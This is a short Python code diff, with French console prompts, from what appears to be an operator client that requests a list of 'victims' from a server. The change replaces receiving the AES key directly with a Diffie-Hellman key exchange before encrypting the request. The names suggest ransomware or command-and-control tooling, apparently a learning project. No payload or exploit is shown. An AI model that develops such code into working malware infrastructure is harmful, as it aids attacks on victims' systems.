@@ -24,7 +24,7 @@ def print_victims_listing(client_socket):
         message_input = input("Entrez votre message : ")
         if message_input == "1":
             message_input = 'LIST_VICTIM_REQ'
-            aes_key = network.receive_message(client_socket)
+            aes_key = security.diffie_hellman_recv_key(client_socket)
             print("Clé" + str(aes_key))
             msg = security.aes_encrypt(utile.message.set_message('LIST_VICTIM_REQ'), aes_key)
             print("Message crypté" + str(msg))
